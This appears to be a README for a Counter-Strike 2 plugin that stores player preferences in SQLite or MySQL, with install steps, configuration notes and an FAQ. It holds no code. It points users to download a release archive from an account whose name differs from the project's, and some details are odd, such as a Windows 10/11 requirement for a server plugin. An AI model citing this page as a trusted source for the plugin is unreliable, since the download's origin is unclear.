# 💾 cs2-ClientPrefs-GoldKingZ - Save player preferences for CS2 servers

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sheldenrigorous762/cs2-ClientPrefs-GoldKingZ/releases)

This software manages player settings across different plugins for Counter-Strike 2 servers. It saves player choices so they keep their customized settings when they return to the server. The tool works by storing data in local files or remote databases.

## ⚙️ System Requirements

Before you install this software, ensure your computer meets these basic requirements:

- A Windows 10 or Windows 11 operating system.
- An existing Counter-Strike 2 server host.
- The Counter-Strike Sharp plugin framework installed on your server.
- Basic access to your server files to move components into folders.

## 🚀 Installation Guide

Follow these steps to set up the software on your server.

1. Open the [Release Page](https://github.com/Sheldenrigorous762/cs2-ClientPrefs-GoldKingZ/releases).
2. Locate the most recent file version listed under Assets.
3. Click the file to download the compressed archive to your computer.
4. Open the downloaded folder.
5. Extract the contents if the files are inside a zip folder.
6. Connect to your CS2 server via your file management tool.
7. Navigate to the game directory path: `addons/counterstrikesharp/plugins/`.
8. Copy the extracted folder into this directory.
9. Restart your game server to load the tool.

## 🛠️ Configuration Settings

The software uses a configuration file to handle how it connects to your systems. You can change these options after the first time you run the plugin.

Look for the configuration file inside the plugin folder. It typically lives in `addons/counterstrikesharp/configs/plugins/ClientPrefs/`. Open this file with a basic text editor like Notepad.

You can adjust these settings:

- Database Type: Choose between keeping data locally in cookies or using a MySQL database for remote storage.
- Storage Path: Define where the system creates the SQLite cookie files.
- Connection Strings: If you use MySQL, input your host address, username, and password here.

Save the file after you make changes. Restart the server again to apply the new settings.

## 🛡️ Understanding Data Storage

This tool provides isolation between server plugins. Every plugin receives its own space for player data. This prevents conflicts and keeps your server performance high.

- Cookie Storage: This method creates small SQLite files on the server disk. It works well for small to medium servers. It requires no extra software setup.
- MySQL Storage: This method sends data to an external database. It works well for large networks with multiple connected servers. It prevents data loss if individual servers go offline.

## 🔍 Troubleshooting Tips

If the plugin does not load, perform these checks:

- Confirm that Counter-Strike Sharp is current and active on your server.
- Review your server logs for any error messages related to the plugin name.
- Verify that your MySQL login details are correct if you chose that storage method.
- Check that the server folder has proper permissions so the tool can write data files.

## 💡 Frequently Asked Questions

Does this tool lag the server?
No. The plugin handles data saves in the background. It does not interrupt game traffic or player movement.

Can I move from cookies to MySQL later?
Yes. You can update the configuration file at any time. The system will attempt to migrate existing data, but we recommend you perform a backup of your current server files before you make changes.

How do players interact with this?
Players do not need to do anything. The plugin saves their preferences during their time on the server. When they join again, the plugin loads their previous settings automatically.

What data does the plugin store?
It stores specific settings related to the plugins on your server. This includes options like interface colors, volume levels, or gameplay toggles that different plugins provide to your players.

Does this tool track player IDs?
Yes. It uses the unique Steam ID of the player to link preferences to the correct account. This ensures that every player gets their specific settings regardless of the device they use to join your server.

Is this compatible with other plugins?
This software serves as a bridge for other plugins. As long as those plugins use this API, they will save data without issues. It remains lightweight and does not conflict with standard management tools.